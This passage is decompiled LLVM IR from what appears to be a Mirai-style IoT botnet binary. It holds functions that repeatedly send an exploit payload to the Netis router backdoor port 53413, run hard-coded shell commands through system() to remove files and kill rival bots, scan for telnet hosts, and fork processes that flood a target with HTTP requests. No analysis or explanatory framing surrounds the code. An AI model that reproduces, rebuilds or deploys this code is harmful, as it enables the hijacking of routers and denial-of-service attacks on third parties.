  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v3_f33c = load i8, i8* %v2_f298, align 2
  %v4_f33c = zext i8 %v3_f33c to i32
  store i32 %v4_f33c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32), i32* %r3.global-to-local, align 4
  %v4_f348 = mul nuw nsw i32 %v4_f33c, 4
  %v5_f348 = add i32 %v4_f348, ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32)
  %v6_f348 = inttoptr i32 %v5_f348 to i32*
  %v7_f348 = load i32, i32* %v6_f348, align 4
  store i32 %v7_f348, i32* @lr, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v3_f36c = load i8, i8* %v2_f2c8, align 1
  %v4_f36c = zext i8 %v3_f36c to i32
  store i32 %v4_f36c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32), i32* %r3.global-to-local, align 4
  %v4_f378 = mul nuw nsw i32 %v4_f36c, 4
  %v5_f378 = add i32 %v4_f378, ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32)
  %v6_f378 = inttoptr i32 %v5_f378 to i32*
  %v7_f378 = load i32, i32* %v6_f378, align 4
  %v1_f37c = load i32, i32* @sp, align 4
  %v2_f37c = inttoptr i32 %v1_f37c to i32*
  store i32 %v7_f378, i32* %v2_f37c, align 4
  %v0_f380 = load i32, i32* @r4, align 4
  %v0_f388 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f388, i32* @r2, align 4
  %v0_f38c = load i32, i32* @lr, align 4
  store i32 %v0_f38c, i32* %r3.global-to-local, align 4
  %v3_f390 = call i32 @HackerPrint(i32 %v0_f380, i32 ptrtoint ([16 x i8]* @global_var_1ded4.533 to i32))
  store i32 %v2_f3dc, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_f3b8 = inttoptr i32 %v2_f3dc to i8*
  store i8 7, i8* %v3_f3b8, align 4
  br label %dec_label_pc_f660

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f1bc
  %v3_f3e4 = inttoptr i32 %v2_f3dc to i8*
  store i8 0, i8* %v3_f3e4, align 4
  store i32 %v2_f3dc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f40c = add i32 %v2_e0ac, 9
  %v4_f40c = inttoptr i32 %v3_f40c to i8*
  store i8 1, i8* %v4_f40c, align 1
  br label %dec_label_pc_f660

dec_label_pc_f414:                                ; preds = %dec_label_pc_f0bc
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f430 = add i32 %v2_e0a8, %v2_f42c
  store i32 %v2_f430, i32* %r3.global-to-local, align 4
  %v1_f434 = inttoptr i32 %v2_f430 to i32*
  %v2_f434 = load i32, i32* %v1_f434, align 4
  store i32 %v2_f434, i32* %r3.global-to-local, align 4
  %v1_f438 = add i32 %v2_f434, 7
  store i32 %v1_f438, i32* @r4, align 4
  %v2_f440 = call i32 @__GI_time(i32* null)
  store i32 %v2_f440, i32* %r3.global-to-local, align 4
  %v0_f448 = load i32, i32* @r4, align 4
  %v3_f448 = icmp ult i32 %v0_f448, %v2_f440
  br i1 %v3_f448, label %dec_label_pc_f450, label %dec_label_pc_f660

dec_label_pc_f450:                                ; preds = %dec_label_pc_f414
  %v2_f46c = add i32 %v2_e0ac, 8
  %v3_f474 = inttoptr i32 %v2_f46c to i8*
  store i8 0, i8* %v3_f474, align 4
  store i32 %v2_f46c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f49c = add i32 %v2_e0ac, 9
  %v4_f49c = inttoptr i32 %v3_f49c to i8*
  store i8 1, i8* %v4_f49c, align 1
  br label %dec_label_pc_f660

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_e0f8
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f4ac = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f4c0 = load i32, i32* @r4, align 4
  %v2_f4cc = mul i32 %v0_f4c0, 28
  %v2_f4d4 = add i32 %v2_f42c, %v2_f4cc
  %v2_f4d8 = inttoptr i32 %v2_f4d4 to i32*
  store i32 %v2_f4ac, i32* %v2_f4d8, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_f4f4 = inttoptr i32 %v2_e0ac to i32*
  %v2_f4f4 = load i32, i32* %v1_f4f4, align 4
  store i32 %v2_f4f4, i32* @r4, align 4
  %v2_f4fc = load i32, i32* bitcast ([703 x i8]** @global_var_2b150.535 to i32*), align 4
  store i32 %v2_f4fc, i32* @r5, align 4
  store i32 %v2_f4fc, i32* %r3.global-to-local, align 4
  %v1_f508 = inttoptr i32 %v2_f4fc to i8*
  %v3_f50c = call i32 @strlen(i8* %v1_f508)
  %v0_f514 = load i32, i32* @r4, align 4
  %v0_f518 = load i32, i32* @r5, align 4
  store i32 %v3_f50c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp48 = inttoptr i32 %v0_f518 to i32*
  %v6_f524 = call i32 @__libc_send(i32 %v0_f514, i32* %tmp48, i32 %v3_f50c, i32 16384)
  %v1_f52c = icmp slt i32 %v6_f524, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_f52c, label %dec_label_pc_f534, label %dec_label_pc_f5ac

dec_label_pc_f534:                                ; preds = %dec_label_pc_f4a4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_f54c = load i32, i32* %v1_f4f4, align 4
  store i32 %v2_f54c, i32* %r3.global-to-local, align 4
  %v3_f554 = call i32 @sclose(i32 %v2_f54c, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_f574 = add i32 %v2_e0ac, 8
  %v3_f57c = inttoptr i32 %v2_f574 to i8*
  store i8 0, i8* %v3_f57c, align 4
  store i32 %v2_f574, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f5a4 = add i32 %v2_e0ac, 9
  %v4_f5a4 = inttoptr i32 %v3_f5a4 to i8*
  store i8 1, i8* %v4_f5a4, align 1
  br label %dec_label_pc_f660

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f4a4
  %v2_f5c8 = add i32 %v2_e0ac, 8
  %v3_f5d0 = add i32 %v2_e0ac, 9
  %v4_f5d0 = inttoptr i32 %v3_f5d0 to i8*
  store i8 3, i8* %v4_f5d0, align 1
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f5f0 = add i32 %v2_e0a8, %v2_f42c
  store i32 %v2_f5f0, i32* %r3.global-to-local, align 4
  %v1_f5f4 = inttoptr i32 %v2_f5f0 to i32*
  %v2_f5f4 = load i32, i32* %v1_f5f4, align 4
  store i32 %v2_f5f4, i32* %r3.global-to-local, align 4
  %v1_f5f8 = add i32 %v2_f5f4, 60
  store i32 %v1_f5f8, i32* @r4, align 4
  %v2_f600 = call i32 @__GI_time(i32* null)
  store i32 %v2_f600, i32* %r3.global-to-local, align 4
  %v0_f608 = load i32, i32* @r4, align 4
  %v3_f608 = icmp ult i32 %v0_f608, %v2_f600
  br i1 %v3_f608, label %dec_label_pc_f610, label %dec_label_pc_f660

dec_label_pc_f610:                                ; preds = %dec_label_pc_f5ac
  %v3_f634 = inttoptr i32 %v2_f5c8 to i8*
  store i8 0, i8* %v3_f634, align 4
  store i32 %v2_f5c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v4_f5d0, align 1
  br label %dec_label_pc_f660

dec_label_pc_f660:                                ; preds = %dec_label_pc_e990, %dec_label_pc_eb38, %dec_label_pc_ee74, %dec_label_pc_f414, %dec_label_pc_f5ac, %dec_label_pc_e0f8, %dec_label_pc_e3ec, %dec_label_pc_f534, %dec_label_pc_f450, %dec_label_pc_f3c0, %dec_label_pc_f24c, %dec_label_pc_f220, %dec_label_pc_f190, %dec_label_pc_f090, %dec_label_pc_f03c, %dec_label_pc_efac, %dec_label_pc_eeb0, %dec_label_pc_ee48, %dec_label_pc_ee1c, %dec_label_pc_ed54, %dec_label_pc_ed00, %dec_label_pc_ec70, %dec_label_pc_eb74, %dec_label_pc_eb0c, %dec_label_pc_eae0, %dec_label_pc_e9cc, %dec_label_pc_e918, %dec_label_pc_e7f8, %dec_label_pc_e780, %dec_label_pc_e5a8, %dec_label_pc_e558, %dec_label_pc_e3c0, %dec_label_pc_e368, %dec_label_pc_f610
  %v1_f664 = add nuw nsw i32 %storemerge612, 1
  store i32 %v1_f664, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v5_f678 = icmp slt i32 %v1_f664, 1000
  br i1 %v5_f678, label %dec_label_pc_e094, label %dec_label_pc_e088

; uselistorder directives
  uselistorder i32 %v1_f664, { 1, 0, 2 }
  uselistorder i32 %v3_f50c, { 1, 0 }
  uselistorder i32 %v2_f3dc, { 0, 10, 4, 3, 5, 6, 7, 8, 2, 1, 9 }
  uselistorder i32 %v3_ef84, { 1, 0 }
  uselistorder i32 %v2_ef3c, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_ee64, { 1, 0, 2 }
  uselistorder i32 %v3_ec48, { 1, 0 }
  uselistorder i32 %v2_ec00, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_eb28, { 1, 0, 2 }
  uselistorder i32 %v2_e810, { 2, 1, 0 }
  uselistorder i32* %v1_e650, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_e240, { 1, 0 }
  uselistorder i32 %v2_e194, { 1, 0 }
  uselistorder i8* %v2_e168, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_e164, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i8 %v2_e118, { 1, 0 }
  uselistorder i32 %v0_e0dc, { 1, 0 }
  uselistorder i32* %v1_e0b4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_e0b0, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v2_e0ac, { 4, 5, 78, 79, 80, 82, 81, 63, 64, 65, 73, 74, 66, 67, 71, 72, 70, 69, 68, 3, 75, 77, 76, 56, 57, 58, 55, 60, 59, 62, 61, 49, 50, 52, 51, 54, 53, 42, 43, 44, 41, 46, 45, 48, 47, 35, 36, 38, 37, 40, 39, 28, 29, 30, 25, 26, 27, 18, 19, 20, 22, 23, 21, 24, 31, 32, 34, 33, 7, 8, 9, 10, 12, 11, 15, 1, 2, 14, 13, 0, 17, 16, 6 }
  uselistorder i32 %v2_e0a8, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_e0a0, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 1, 5, 4, 7, 6, 8, 9, 10, 11, 12, 15, 14, 13, 3, 2, 0 }
  uselistorder i32 %v2_f42c, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_e5fc, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_e444, { 1, 0 }
  uselistorder i32 %v1_e070, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_df6c, { 3, 7, 6, 5, 4, 8, 9, 12, 11, 10, 13, 0, 14, 1, 17, 18, 19, 16, 2, 15 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-616, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 180, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 16, 33, 34, 36, 35, 37, 38, 39, 42, 40, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 58, 59, 62, 64, 63, 65, 66, 60, 69, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 88, 85, 86, 89, 91, 90, 92, 93, 87, 96, 94, 95, 97, 98, 99, 102, 100, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 116, 117, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 172, 127, 128, 129, 130, 131, 132, 135, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 145, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 175, 176, 177, 178, 179, 173, 193, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 174, 194, 195, 196, 198, 197, 200, 199 }
  uselistorder i32* %r2.global-to-local, { 114, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 112, 113, 109, 115, 110, 116, 117 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32), { 2, 4, 3, 5, 0, 6, 1, 7 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1de64.524 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32), { 2, 4, 3, 5, 0, 6, 1, 7 }
  uselistorder i8 3, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder i32 1000, { 3, 2, 1, 5, 4, 0, 6 }
  uselistorder label %dec_label_pc_f660, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e610, { 1, 0 }
  uselistorder label %dec_label_pc_e5a8, { 1, 0 }
  uselistorder label %dec_label_pc_e0f8, { 1, 0 }
  uselistorder label %dec_label_pc_e094, { 1, 0 }
  uselistorder label %dec_label_pc_dfb4, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63152, i32* %stack_var_-4, align 4
  %v2_f6ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f6ac, i32* @fp, align 4
  %v2_f710 = ptrtoint i32* %stack_var_-52 to i32
  %v2_f738 = ptrtoint i32* %stack_var_-1076 to i32
  %tmp21 = bitcast i32* %stack_var_-1076 to i8*
  br label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6b8, %entry
  %v0_f6c4 = call i32 @socket()
  %v0_f6d0 = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f6f4 = call i32 @htons(i32 53413)
  store i32 %v2_f738, i32* @r0, align 4
  %v3_f748 = call i32 @sprintf(i32 %v2_f738, i32 ptrtoint ([711 x i8]* @global_var_1dee4.537 to i32))
  %v3_f75c = call i32 @strlen(i8* %tmp21)
  %v7_f790 = call i32 @__libc_sendto(i32 %v0_f6c4, i32* nonnull %stack_var_-1076, i32 %v3_f75c, i32 0, i32 %v2_f710, i32 16)
  br label %dec_label_pc_f6b8

; uselistorder directives
  uselistorder i32 %v2_f738, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v3_f7a4 = load i32, i32* @fp, align 4
  %v2_f7c8 = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_1e1b4.541 to i32))
  store i32 %v3_f7a4, i32* @fp, align 4
  ret i32 %v2_f7c8
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2184 = alloca i32, align 4
  %stack_var_-2312 = alloca i32, align 4
  %stack_var_-2024 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f7e4 = load i32, i32* @r4, align 4
  store i32 %v3_f7e4, i32* %stack_var_-20, align 4
  %v6_f7e4 = load i32, i32* @fp, align 4
  store i32 63468, i32* %stack_var_-4, align 4
  %v16_f7e4 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f7e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f7e8, i32* @fp, align 4
  %v21_f80c = ptrtoint i8** %stack_var_-40 to i32
  store i32 %v21_f80c, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fe20.551, i32 0, i32 0), i8** %stack_var_-40, align 4
  %v2_f81c = ptrtoint i32* %stack_var_-1060 to i32
  store i32 %v2_f81c, i32* @r0, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_1f9f4.803 to i32), i32* @r1, align 4
  store i32 988, i32* @r2, align 4
  %v0_f830 = call i32 @memcpy()
  %v2_f83c = ptrtoint i32* %stack_var_-2024 to i32
  store i32 %v2_f83c, i32* @r0, align 4
  store i32 ptrtoint ([241 x i8*]* @global_var_1edd0.1031 to i32), i32* @r1, align 4
  store i32 964, i32* @r2, align 4
  %v0_f850 = call i32 @memcpy()
  %v6_f868 = icmp sgt i32 %tmp12, 0
  br i1 %v6_f868, label %dec_label_pc_f86c, label %dec_label_pc_fa20

dec_label_pc_f86c:                                ; preds = %entry
  %v2_f870 = ptrtoint i32* %stack_var_-2312 to i32
  store i32 128, i32* @r2, align 4
  %v2_f880 = bitcast i32* %stack_var_-2312 to i8*
  %v3_f880 = call i32 @__GI_memset(i8* %v2_f880, i32 0)
  %v2_f8a4 = add i32 %v16_f7e4, -52
  %v1_f8a8 = inttoptr i32 %v2_f8a4 to i32*
  %v2_f8a8 = load i32, i32* %v1_f8a8, align 4
  store i32 %v2_f8a8, i32* @lr, align 4
  store i32 %v16_f7e4, i32* @r4, align 4
  store i32 %v2_f870, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_f948 = call i32 @__GI_snprintf(i32 %v2_f870, i32 127, i32 ptrtoint ([100 x i8]* @global_var_1fe50.1033 to i32), i32 %v2_f8a8, i32 %v2_f8a8, i32 %v2_f8a8)
  %v1_f9d4 = call i32 @__libc_system(i32 %v2_f870)
  store i32 %v16_f7e4, i32* @lr, align 4
  %v2_f9fc = ptrtoint i32* %stack_var_-2184 to i32
  store i32 %v2_f9fc, i32* @r0, align 4
  %v3_fa08 = call i32 @sprintf(i32 %v2_f9fc, i32 ptrtoint ([14 x i8]* @global_var_1fed4.1037 to i32))
  %v1_fa18 = call i32 @__libc_system(i32 %v2_f9fc)
  br label %dec_label_pc_fa28

dec_label_pc_fa20:                                ; preds = %entry
  %v1_fa24 = call i32 @sleep(i32 5)
  br label %dec_label_pc_fa28

dec_label_pc_fa28:                                ; preds = %dec_label_pc_f86c, %dec_label_pc_fa20
  %storemerge10 = phi i32 [ %v1_fa24, %dec_label_pc_fa20 ], [ %v1_fa18, %dec_label_pc_f86c ]
  %v2_fa2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fa2c, i32* @r4, align 4
  store i32 %v6_f7e4, i32* @fp, align 4
  ret i32 %storemerge10

; uselistorder directives
  uselistorder i32 %v2_f9fc, { 0, 2, 1 }
  uselistorder i32 %v2_f8a8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f870, { 0, 2, 1 }
  uselistorder i32 %v16_f7e4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder label %dec_label_pc_fa28, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_fa4c = load i32, i32* @fp, align 4
  store i32 %v3_fa4c, i32* %stack_var_-16, align 4
  %v2_fa58 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_1fee4.1040 to i32))
  %v2_fa60 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1ff10.1042 to i32))
  %v2_fa68 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1ff28.1044 to i32))
  %v2_fa70 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1ff10.1042 to i32))
  %v2_fa78 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_1ff40.1046 to i32))
  %v2_fa80 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_1ff50.1048 to i32))
  %v2_fa88 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_1ff5c.1050 to i32))
  %v2_fa90 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_1ff74.1052 to i32))
  %v2_fa98 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_1ff88.1054 to i32))
  %v2_faa0 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_1ff94.1056 to i32))
  %v2_faa8 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_1ffa8.1058 to i32))
  %v2_fab0 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1ffb8.1060 to i32))
  %v2_fab8 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_1ffd0.1062 to i32))
  %v2_fabc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fabc, i32* @fp, align 4
  ret i32 %v2_fab8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_faf4 = load i32, i32* @fp, align 4
  store i32 64252, i32* %stack_var_-4, align 4
  %v2_faf8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_faf8, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_fb20 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fb30 = icmp eq i32 %v1_fb20, 0
  br i1 %v2_fb30, label %dec_label_pc_fb38, label %dec_label_pc_fb44

dec_label_pc_fb38:                                ; preds = %entry
  br label %dec_label_pc_fc2c

dec_label_pc_fb44:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_fb48 = add i32 %v1_fb20, 16
  %v2_fb48 = inttoptr i32 %v1_fb48 to i32*
  %v3_fb48 = load i32, i32* %v2_fb48, align 4
  %v1_fb4c = inttoptr i32 %v3_fb48 to i32*
  %v2_fb4c = load i32, i32* %v1_fb4c, align 4
  %v1_fb54 = add i32 %v1_fb20, 12
  %v2_fb54 = inttoptr i32 %v1_fb54 to i32*
  %v3_fb54 = load i32, i32* %v2_fb54, align 4
  store i32 %v3_fb54, i32* @r2, align 4
  %v2_fb60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_fb6c = call i32 @bcopy(i32 %v2_fb4c, i32 %v2_fb60, i32 %v3_fb54)
  %v1_fb84 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_fbb4 = call i32 @socket()
  %v6_fbdc = call i32 @__GI_setsockopt(i32 %v0_fbb4, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_fbe4 = icmp eq i32 %v0_fbb4, -1
  br i1 %v3_fbe4, label %dec_label_pc_fbec, label %dec_label_pc_fbf8

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fb44
  br label %dec_label_pc_fc2c

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fb44
  %v3_fc08 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_fc08 = call i32 @__libc_connect(i32 %v0_fbb4, %sockaddr* %v3_fc08, i32 16)
  %v3_fc10 = icmp eq i32 %v4_fc08, -1
  br i1 %v3_fc10, label %dec_label_pc_fc18, label %dec_label_pc_fc24

dec_label_pc_fc18:                                ; preds = %dec_label_pc_fbf8
  br label %dec_label_pc_fc2c

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fbf8
  br label %dec_label_pc_fc2c

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_fc18, %dec_label_pc_fbec, %dec_label_pc_fb38, %dec_label_pc_fc24
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_fb38 ], [ 0, %dec_label_pc_fbec ], [ 0, %dec_label_pc_fc18 ], [ %v0_fbb4, %dec_label_pc_fc24 ]
  store i32 %v3_faf4, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_fc2c, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-804 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_fc40 = load i32, i32* @r4, align 4
  store i32 %v3_fc40, i32* %stack_var_-20, align 4
  %v6_fc40 = load i32, i32* @fp, align 4
  store i32 64584, i32* %stack_var_-4, align 4
  %v16_fc40 = ptrtoint i32* %stack_var_-20 to i32
  %v2_fc44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fc44, i32* @fp, align 4
  %v2_fc68 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_fc68, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_2137c.1126 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_fc7c = call i32 @memcpy()
  %v2_fc94 = call i32 @__GI_time(i32* null)
  %v3_fc9c = load i32, i32* %stack_var_0, align 4
  %v2_fca0 = add i32 %v3_fc9c, %v2_fc94
  %v0_fca8 = call i32 @random()
  %v2_fcb8 = srem i32 %v0_fca8, 3
  %v3_fccc = mul nsw i32 %v2_fcb8, 4
  %v2_fcd4 = add i32 %v3_fccc, %v16_fc40
  %v2_fcd8 = add i32 %v2_fcd4, -272
  %v1_fcdc = inttoptr i32 %v2_fcd8 to i32*
  %v2_fcdc = load i32, i32* %v1_fcdc, align 4
  store i32 %v2_fcdc, i32* @r4, align 4
  %v0_fce0 = call i32 @random()
  %v2_fd18 = ptrtoint i32* %stack_var_-804 to i32
  store i32 %v2_fd18, i32* @r0, align 4
  %v3_fd34 = call i32 @sprintf(i32 %v2_fd18, i32 ptrtoint ([62 x i8]* @global_var_21474.1135 to i32))
  br label %dec_label_pc_fde0

dec_label_pc_fd44:                                ; preds = %dec_label_pc_fde0
  %v0_fd44 = call i32 @__libc_fork()
  %v2_fd4c = icmp eq i32 %v0_fd44, 0
  %v1_fdd8 = add nuw i32 %storemerge2, 1
  br i1 %v2_fd4c, label %dec_label_pc_fde0, label %dec_label_pc_fdb4.preheader

dec_label_pc_fdb4.preheader:                      ; preds = %dec_label_pc_fd44
  %tmp27 = bitcast i32* %stack_var_-804 to i8*
  br label %dec_label_pc_fdb4

dec_label_pc_fd58:                                ; preds = %dec_label_pc_fdb4
  %v5_fd74 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_fd84 = icmp eq i32 %v5_fd74, 0
  br i1 %v2_fd84, label %dec_label_pc_fdb4, label %dec_label_pc_fd8c

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd58
  %v3_fd94 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_fd94, i32* @r2, align 4
  %v3_fda8 = call i32 @__libc_write(i32 %v5_fd74, i32* nonnull %stack_var_-804)
